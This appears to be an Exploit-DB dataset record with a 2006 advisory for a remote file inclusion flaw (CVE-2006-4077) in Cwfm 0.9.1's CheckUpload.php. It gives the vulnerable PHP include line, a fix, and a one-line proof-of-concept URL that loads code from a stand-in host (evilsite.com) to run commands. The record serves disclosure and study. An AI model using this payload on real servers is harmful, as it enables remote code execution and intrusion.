{
  "id": "2151",
  "title": "Cwfm 0.9.1 - &#039;Language&#039; Remote File Inclusion",
  "cve": "CVE-2006-4077",
  "vuln_type": "rce",
  "code": "+--------------------------------------------------------------------\r\n+\r\n+ Cwfm-0.9.1 (Language) Remote File Inclusion\r\n+\r\n+ Original advisory:\r\n+\r\n+ http://www.bb-pcsecurity.de/Websecurity/301/org/Cwfm-0.9.1_(Language)_Remote_File_Inclusion.htm\r\n+\r\n+--------------------------------------------------------------------\r\n+\r\n+ Affected Software .: Cwfm 0.9.1\r\n+ Venedor ...........: http://cwfm.sourceforge.net/\r\n+ Class .............: Remote File Inclusion in /CheckUpload.php\r\n+ Risk ..............: high (Remote File Execution)\r\n+ Found by ..........: Philipp Niedziela\r\n+ Contact ...........: webmaster[at]bb-pcsecurity[.]de\r\n+                      http://www.bb-pcsecurity.de\r\n+\r\n+--------------------------------------------------------------------\r\n+\r\n+ Code /CheckUpload.php\r\n+\r\n+ .....\r\n+ session_start();\r\n+ include_once(\"Global.php\");\r\n+ //include_once(\"lang/$Language.php\");\r\n+ include_once(\"$Language.php\");\r\n+ .....\r\n+\r\n+--------------------------------------------------------------------\r\n+\r\n+ $Language is not properly sanitized before being used.\r\n+\r\n+--------------------------------------------------------------------\r\n+\r\n+ Solution:\r\n+ Declare $Language before using, include config-file or\r\n+ denie direct access to the vuln file.\r\n+\r\n+--------------------------------------------------------------------\r\n+\r\n+ PoC:\r\n+\r\n+ http://[target]/CheckUpload.php?Language=http://evilsite.com/dblib.php/&cmd=ls\r\n+\r\n+--------------------------------------------------------------------\r\n+\r\n+ Note:\r\n+ Venedor contacted, but no response. So do a dirty patch.\r\n+\r\n+-------------------------[ E O F ]----------------------------------\r\n\r\n# milw0rm.com [2006-08-08]",
  "url": "https://www.exploit-db.com/exploits/2151"
}